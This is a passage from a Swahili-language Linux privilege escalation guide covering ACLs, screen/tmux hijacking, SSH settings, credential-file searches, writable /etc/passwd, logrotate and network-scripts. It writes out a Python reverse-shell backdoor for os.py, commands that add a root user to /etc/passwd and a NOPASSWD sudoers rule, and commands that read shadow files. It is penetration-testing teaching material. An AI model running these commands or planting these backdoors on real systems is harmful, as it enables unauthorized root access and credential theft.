 execve(file,argv,0);
}
```

## Uwezo

Linux capabilities humpa **process sehemu ndogo ya ruhusa za root zinazopatikana**. Kwa ufanisi, hii hugawa **ruhusa za root katika vitengo vidogo na tofauti**. Kila kimoja cha vitengo hivi kinaweza kupewa process kivyake. Kwa njia hii, seti nzima ya ruhusa hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit ya "execute"** humaanisha kuwa mtumiaji husika anaweza kutumia "**cd**" kuingia kwenye folda.\
Bit ya **"read"** humaanisha kuwa mtumiaji anaweza **kuorodhesha** **files**, na bit ya **"write"** humaanisha kuwa mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) ni safu ya pili ya ruhusa za hiari, zinazoweza **kubatilisha ruhusa za jadi za ugo/rwx**. Ruhusa hizi huboresha udhibiti wa ufikiaji wa file au saraka kwa kuruhusu au kukataa haki kwa watumiaji mahususi ambao si wamiliki wala sehemu ya kundi. Kiwango hiki cha **uainishaji wa kina huhakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanapatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Mpe** mtumiaji "kali" ruhusa za kusoma na kuandika kwenye file:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pata** faili zenye ACL mahususi kwenye mfumo:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ya ACL iliyofichwa kwenye drop-ins za sudoers

Usanidi usio sahihi unaotokea mara nyingi ni faili inayomilikiwa na root ndani ya `/etc/sudoers.d/` yenye mode `440`, lakini bado inampa user mwenye privileges chache ruhusa ya kuandika kupitia ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sheria ya sudo licha ya mode bits zenye vizuizi:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Hii ni njia ya persistence/privesc yenye athari kubwa kupitia ACL, kwa sababu ni rahisi kuikosa unapokagua kwa kutumia `ls -l` pekee.

## Shell sessions zilizo wazi

Ufikiaji wa GNU Screen wa mtumiaji mwingine hutegemea usanidi na ACL za **session inayoendeshwa**, si toleo lake pekee. [GNU Screen inaeleza](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) kwamba lazima ijengwe ikiwa na usaidizi wa multiuser; `multiuser on` na ruhusa inayofaa ya `acladd` au `aclchg` humwezesha mtumiaji mwingine ku-attach. [Mwongozo pia unahitaji setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) ili kutafuta session ya mtumiaji mwingine. Socket inayoonekana inayomilikiwa na root au binary ya `screen` yenye SUID pekee haithibitishi kwamba kuna shell ya root inayoweza ku-attach. Thibitisha kuwa session inayoendelea ni multiuser, mtumiaji wa sasa ana ruhusa halali ya kuingiza amri au kutumia input, na shell katika session hiyo inaendeshwa na mmiliki mwenye mamlaka ya juu kabla ya kuichukulia kama njia ya privilege escalation.

### screen sessions hijacking

**Orodhesha screen sessions**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Maeneo ya socket (baadhi ya mifumo hufichua moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Unganisha kwenye session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Hili lilikuwa tatizo katika **matoleo ya zamani ya tmux**. Sikuweza kuteka nyara session ya tmux (v2.1) iliyoundwa na root nikiwa mtumiaji asiye na priviliji.

**Orodhesha sessions za tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Mahali pa socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Orodhesha ukitumia socket hiyo; unaweza kuanzisha tmux session kwenye socket hiyo...](<../../images/image (837).png>)

**Unganisha kwenye session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Keys zilizozalishwa kwa kutumia Debian au builds za OpenSSL za derivatives zilizoathirika katika kipindi cha kihistoria cha udhaifu zinaweza kuwa na randomness inayotabirika; distribution ya sasa ya host au toleo lililotiwa viraka la OpenSSL halithibitishi jinsi key ya zamani ilivyozalishwa. Kagua **key husika** dhidi ya blacklist ya kihistoria inayofaa na taarifa za asili yake. Mwongozo wa Debian wa [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) unaeleza jinsi ya kukagua public keys na `authorized_keys`, na [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) inaweka kumbukumbu ya marekebisho ya OpenSSL. Ingizo katika `authorized_keys` ya akaunti yenye mapendeleo ni kidokezo cha escalation tu ikiwa private key inayolingana inaweza kupatikana na sera ya SSH inayotumika bado inakubali key hiyo kwa akaunti hiyo; **host key** dhaifu yenyewe si credential ya kuingia. Badilisha keys zilizoathirika na uondoe ruhusa zao za zamani.

### SSH Thamani za usanidi zinazovutia

- **PasswordAuthentication:** Hubainisha kama uthibitishaji kwa password unaruhusiwa. Chaguo-msingi la OpenSSH ya upstream ni `yes`; usanidi wa distribution unaweza kulibadilisha.
- **PubkeyAuthentication:** Hubainisha kama uthibitishaji kwa public key unaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitishaji kwa password unaruhusiwa, hubainisha kama server inaruhusu kuingia katika akaunti zenye password string tupu. Chaguo-msingi ni `no`.

### Faili za udhibiti wa kuingia

Faili hizi huathiri nani anaweza kuingia na jinsi:

- **`/etc/nologin`**: ikiwa ipo, huzuia watumiaji wasio root kuingia na huonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia mahali ambapo root anaweza kuingia (orodha ya TTY zinazoruhusiwa).
- **`/etc/motd`**: bango linaloonyeshwa baada ya kuingia (linaweza kuvuja maelezo ya mazingira au matengenezo).

### PermitRootLogin

Hubainisha kama root anaweza kuingia kwa kutumia ssh. Chaguo-msingi la OpenSSH ya upstream ni `prohibit-password`; usanidi wa distribution unaweza kulibadilisha. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia kwa kutumia private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa kutumia private key pekee, na ikiwa chaguo za commands zimebainishwa
- `no` : hapana

### Certificate authorities za SSH user zinazoaminika

`TrustedUserCAKeys` hutaja public keys ambazo sshd inaziamini kusaini certificates za **user**. Ikiwa private CA key inayolingana inaweza kusomwa na user mwenye mapendeleo ya chini, kagua nani anaweza kupata certificate na ni principals zipi za akaunti inaweza kuthibitisha. `AuthorizedPrincipalsFile` au `AuthorizedPrincipalsCommand` zinaweza kuzuia majina yanayokubaliwa; ikiwa hakuna iliyosanidiwa, certificate lazima iwe na jina la akaunti lengwa. `PermitRootLogin prohibit-password` huzuia uthibitishaji wa root kwa password lakini bado inaweza kuruhusu uthibitishaji kwa certificate. Njia ya key iliyo wazi pekee haithibitishi ufikiaji: thibitisha jozi ya public/private key, sheria za `Match` zinazotumika, sera ya akaunti, passphrase ya key, revocation na signature algorithms zinazokubaliwa. Usijumuishe bytes za private key kwenye matokeo ya enumeration. Angalia [mwongozo wa usanidi wa OpenSSH server](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key inaweza pia kutumika **bila kusomeka** na user wa sasa ikiwa sheria ya kukabidhi mapendeleo inamruhusu user huyo kutumia certificate signer isiyo na vizuizi, [kama `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), chini ya utambulisho wa mmiliki wa key. Linganisha command na arguments zinazoruhusiwa hasa na ufikiaji wa akaunti ya signer kwa key, CA public key inayoaminika na usanidi wa sshd unaotumika, principal inayokubaliwa kwa akaunti lengwa, uhalali wa certificate na sera ya kuingia ya akaunti hiyo. Command ya signer iliyokabidhiwa au faili ya CA inayoaminika pekee haithibitishi ufikiaji wa akaunti nyingine; usisaini certificate ya majaribio wakati wa passive enumeration.

### AuthorizedKeysFile

Hubainisha faili zilizo na public keys zinazoweza kutumika kwa uthibitishaji wa user. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kubainisha absolute paths** (zinazoanza kwa `/`) au **relative paths kutoka kwenye home directory ya user**. Kwa mfano:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Configuration hiyo itaonyesha kwamba ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuwezesha **kutumia SSH keys zako za ndani badala ya kuziacha keys** (bila passphrases!) kwenye server yako. Kwa hiyo, utaweza **kuruka** kupitia ssh **kwenda kwa host** na kutoka hapo **kuruka kwenda kwa host nyingine** kwa **kutumia** **key** iliyo kwenye **host yako ya awali**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hivi:

```
Host example.com
  ForwardAgent yes
```

Kumbuka kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohamia kwenye mashine tofauti, mashine hiyo itaweza kufikia funguo (hili ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** **chaguo** hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** uelekezaji wa ssh-agent kwa kutumia neno kuu `AllowAgentForwarding` (kwa chaguo-msingi, umeruhusiwa).

Ukigundua kuwa Forward Agent imesanidiwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya ili kuongeza mamlaka**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za Profile

Faili `/etc/profile` na faili zilizo ndani ya `/etc/profile.d/` ni **scripts zinazoendeshwa mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ukiweza **kuandika au kurekebisha yoyote kati ya hizo, unaweza kuongeza mamlaka**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ikiwa utapata script yoyote ya profile isiyo ya kawaida, unapaswa kuikagua ili kuona kama ina **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia majina tofauti au kuwa na nakala rudufu. Kwa hivyo, inashauriwa **kuzitafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama zina hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili la `/etc/passwd` (au faili linganifu)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza nenosiri kwa kutumia mojawapo ya amri zifuatazo.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Kisha ongeza mtumiaji `hacker` na uweke nenosiri lililozalishwa.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa kutumia `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

KUMBUKA: Kwenye majukwaa ya BSD, `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`; pia, `/etc/shadow` imepewa jina jipya `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye faili fulani ya **usanidi wa huduma**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor yako itatekelezwa Tomcat itakapoanzishwa wakati ujao.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa muhimu: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho, lakini jaribu)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Mahali pa Ajabu/Faili Zinazomilikiwa

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Faili zilizobadilishwa katika dakika chache zilizopita

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Faili za hifadhidata za SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Kwa hifadhidata za programu zinazosomeka, kagua majina ya jedwali na safu wima ili kutafuta usernames na password hashes. Kupata hash, kurejesha password yake, na kuthibitisha kuwa inatumika tena kwa akaunti ya ndani ni hatua tofauti; mfuatano wa jumla wa herufi 32 za hexadecimal hautoshi kubaini kuwa ni MD5 au kutoa ufikiaji wa akaunti.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ikiwa historia ya shell inayosomeka ina amri ya `sudo` ikifuatiwa na mstari mfupi unaofanana na nenosiri, kagua mwenyewe mistari inayouzunguka. Nenosiri lililoingizwa kwenye kidokezo cha kawaida cha `sudo` halihifadhiwi kwenye historia ya shell; mstari unaofuata ni ingizo linalowezekana kuingizwa kimakosa kwenye shell, si uthibitisho wa nenosiri sahihi. Alama ya `.sudo_as_admin_successful` hurekodi matumizi ya awali, si ruhusa ya sasa.

### Faili zilizofichwa

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binaries kwenye PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Faili za wavuti**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Hifadhi rudufu**

Kagua faili zinazosomeka ndani ya saraka za hifadhi rudufu, pamoja na faili ambazo **majina** yake yana neno `backup`: jalada lenye jina lisiloeleweka au kiendelezi kinachoashiria usimbaji fiche bado linaweza kufichua data ya zamani ya programu. Jalada lililosimbwa fiche ni dalili tu ya uwezekano wa kufichuka. Kurejesha nenosiri, kukagua yaliyomo, kurejesha hash ya programu, na kutumia tena nenosiri hilo kwa akaunti ya Unix ni hatua tofauti zinazopaswa kuthibitishwa; kuwepo kwa hash kwenye jalada hakuthibitishi kuwa kunaweza kuingia kwenye akaunti ya ndani.

Hifadhi rudufu za mashine pepe zinazosomeka zinastahili ukaguzi huohuo. Faili ya usanidi ya VirtualBox `.vbox` inaweza kutambua picha za `.vdi` zilizounganishwa na kuwa na metadata ya ufunguo wa diski uliosimbwa fiche; [VirtualBox inaeleza kuwa ufunguo wa data iliyosimbwa huhifadhiwa kwenye usanidi wa VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Faili ya usanidi na picha ya diski lazima zote zipatikane ili ukaguzi wa diski nje ya mfumo uwezekane. Volume ya guest inaweza kuwa na [tabaka lake la usimbaji fiche la LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), linalohitaji ufunguo tofauti. Hata baada ya usimbuaji fiche ulioidhinishwa, skripti au usanidi wa zamani unaweza kuwa na nenosiri; thibitisha kuwa kitambulisho hicho bado kinatumika kwa akaunti ya host na kwamba sera yake ya `sudo` inaruhusu amri yenye upendeleo kabla ya kuita hali hii local privilege escalation. Orodhesha njia na ruhusa bila kunakili, kusimbua fiche au ku-mount picha za diski wakati wa uchunguzi usiobadilisha mfumo.

Unapokagua jalada linalosomeka, orodhesha majina ya vipengee vyake kabla ya kutoa chochote: faili zilizofichwa za uthibitishaji, taarifa za misimbo ya kurejesha akaunti au funguo za SSH zinaweza kuwepo hata kama nakala za sasa zinalindwa. Majina ya faili ni dalili tu; thibitisha maudhui na matumizi tena ya akaunti kando.

Tanguliza **majala yanayosomeka yanayomilikiwa na mtumiaji mwingine** kwenye saraka za hifadhi rudufu, hasa majala yanayomilikiwa na root na yanayofikika kupitia uanachama wa kikundi. Jalada la zamani linaweza kuwa na usanidi au siri ya uthibitishaji hata kama nakala ya sasa inalindwa. Kwa UI ya ndani ya hifadhi rudufu kama [Backrest](https://garethgeorge.github.io/backrest/), kagua akaunti halisi ya huduma na ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma usanidi wake au kujithibitisha kwenye UI. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) zake na [kiolesura cha amri cha restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) vinaweza kutumia ruhusa za faili na amri za daemon; listener ya loopback pekee haiamui athari. `passwordBcrypt` ya Backrest ni hash ya bcrypt iliyosimbwa kwa base64 katika [msimbo wake wa uthibitishaji](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), si nenosiri lisilosimbwa. Thibitisha utambulisho wa huduma, vitambulisho vinavyoweza kutumika, na ufikiaji wa mpango au hifadhi husika kabla ya kuchukulia jalada au UI iliyofichuka kuwa mpaka wa ruhusa.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Faili zinazojulikana kuwa na nywila

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); hutafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), programu huria inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani ya Windows, Linux na Mac.

Ikiwa `/etc/guacamole/guacamole.properties` inaweza kusomwa, kagua mipangilio yake ya muunganisho wa hifadhidata ya `mysql-*`, `postgresql-*` au `sqlserver-*`. Ikiwa akaunti imeidhinishwa kusoma majedwali ya Guacamole JDBC, `guacamole_connection_parameter` inaweza kuwa na thamani zilizohifadhiwa za SSH za `username`, `password`, `private-key` au `passphrase`. Anza kwa kukagua connection IDs na parameter names, kisha kagua tu safu zinazohusika; thamani iliyohifadhiwa inaweza kuwa tokeni inayobadilika au rejeleo la vault badala ya siri inayoweza kutumika tena. Angalia [schema ya Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) na [vigezo vya muunganisho wa SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Hifadhi chaguomsingi ya pswm password manager](https://github.com/Julynx/pswm#usage) ni vault iliyosimbwa kwa njia fiche iliyo katika `~/.local/share/pswm/pswm` kwa chaguomsingi. Ikiwa vault ya mtumiaji mwingine inaonekana, kagua umiliki wake na kama akaunti yako inaweza kuisoma kweli. Njia ya vault pekee haionyeshi taarifa za kuingia; kurejesha nywila kuu, kupata nywila ya akaunti inayoweza kutumika tena, na kuthibitisha ruhusa za akaunti hiyo ni hatua tofauti.

[Hifadhidata chaguomsingi ya Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) ni `~/.passpie/`, ikiwa na keyring ya `.keys` na faili za kitambulisho za `.pass` zilizosimbwa kwa njia fiche ndani ya vikundi vya saraka. Saraka ya hifadhidata inayoonekana ni kidokezo cha njia pekee: thibitisha ufikiaji wa key na ingizo husika lililosimbwa, passphrase kuu yoyote inayohitajika, na kama kitambulisho kilichorejeshwa ni cha akaunti yenye ruhusa zaidi. Passpie pia inasaidia [njia maalum za hifadhidata](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), kwa hiyo njia chaguomsingi haijumuishi kila kitu. Uhesabuji wa kiotomatiki unapaswa kuorodhesha metadata bila kuhamisha taarifa za kuingia au kuchapisha key material.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadiri log inavyokuwa ya ajabu, ndivyo inavyovutia zaidi (huenda).\
Pia, baadhi ya **audit logs** zilizosanidiwa "**vibaya**" (zilizowekewa backdoor?) zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa kwenye chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Ili **kusoma logs, kundi** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) litakuwa na manufaa sana.

### Faili za shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Utafutaji wa Jumla wa Creds/Regex

Unapaswa pia kutafuta faili zenye neno "**password**" kwenye **jina** lake au ndani ya **maudhui** yake, na pia kutafuta IP na barua pepe ndani ya logs, au regex za hashes.\
Sitaorodhesha hapa jinsi ya kufanya yote haya, lakini ikiwa ungependa, unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili Zinazoweza Kuandikwa

### Python library hijacking

Ikiwa unajua **mahali** ambapo Python script itaendeshwa na **unaweza kuandika ndani ya** folda hiyo au unaweza **kurekebisha Python libraries**, unaweza kurekebisha OS library na kuiweka backdoor (ikiwa unaweza kuandika mahali ambapo Python script itaendeshwa, nakili na ubandike library ya os.py).

Ili **kuweka backdoor kwenye library**, ongeza tu mstari ufuatao mwishoni mwa library ya os.py (badilisha IP na PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Unyonyaji wa logrotate

Kazi ya `logrotate` yenye ruhusa za juu inaweza kuunda njia ya kuandika faili za watumiaji wengine inapozungusha logi iliyo chini ya directory ambayo mtumiaji mwenye ruhusa za chini anaweza kubadilisha au kuelekeza kwingine wakati wa mzunguko. Logi inayoweza kuandikwa peke yake ni kidokezo tu. Thibitisha rule halisi inayotumika na maagizo yake ya `create`, `olddir`, na `su`; utambulisho unaotumika wa scheduler; ruhusa za kuandika na kutafuta kwenye parent ya logi; na kama build na policy iliyosakinishwa zinaruhusu kubadilisha mahali pa kuhifadhi. Shell ya baadaye yenye ruhusa za juu lazima pia ipakie faili iliyotokana ili kuandika kwenye startup file kuweze kusababisha command execution. Kagua ratiba, rule, toleo/ufungashaji na metadata ya njia bila kuanzisha mzunguko au kujaribu race.

> [!TIP]
> Usichukulie `3.18.0` au nambari yoyote ya toleo pekee kuwa kikomo cha uwezekano wa unyonyaji. [Change log ya upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) inaonyesha uimarishaji dhidi ya directory na symlink katika matoleo mengi, na distributions zinaweza kurudisha fixes kwenye matoleo ya zamani. [Manual ya upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) inapendekeza `su` wakati root inazungusha logi kwenye directory zinazodhibitiwa na watumiaji wasio na ruhusa za juu; thibitisha rule inayotumika na tabia halisi.

Maelezo zaidi kuhusu vulnerability hii yanapatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Unaweza ku-exploit vulnerability hii kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Vulnerability hii inafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hiyo ukigundua kuwa unaweza kubadilisha logi, angalia ni nani anayesimamia logi hizo na kama unaweza kuongeza privileges kwa kubadilisha logi hizo na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeleo la vulnerability:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Faili ya `ifcfg-*` ni kidokezo cha kuchunguza pale ambapo mtumiaji mwenye ruhusa za chini anaweza kuiunda au kuibadilisha **na** njia ya kuwasha mtandao yenye ruhusa za juu itasoma faili hiyo hasa. Thibitisha ruhusa zinazotumika za faili na directory, interface iliyochaguliwa, utekelezaji wa `ifup`/`ifdown` uliosakinishwa, na ni nani anayeiendesha. Faili inayoweza kuandikwa peke yake haisababishi execution. [Mwongozo wa mitandao wa RHEL 7 wa Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) unatofautisha network scripts za zamani na NetworkManager: NetworkManager yenyewe haiwashi za zamani. [Nyaraka za RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) zinaeleza kuwa `ifup`/`ifdown` zake za kawaida hutumia NetworkManager, huku package ya hiari ya zamani ikitoa shell scripts.

Kwenye mfumo unaotumia scripts za zamani zenye ruhusa za juu, assignment ya `ifcfg-*` isiyo na quotes na inayosomwa na shell, kama `NAME=`, inaweza kuvuka mpaka wa code execution. Thibitisha parser, thamani na njia halisi ya kuiwasha; usihitimishe kuwa shell itaichanganua kutokana na jina la faili au kuwepo kwa NetworkManager. Wrapper inayoruhusiwa na sudo, inayoandika ingizo la mpigaji kwenye faili ya `ifcfg-*` kisha kuita `ifup` ya zamani, ni njia tofauti ya kufikia mpaka huu hata kama mpigaji hawezi kuhariri faili moja kwa moja.

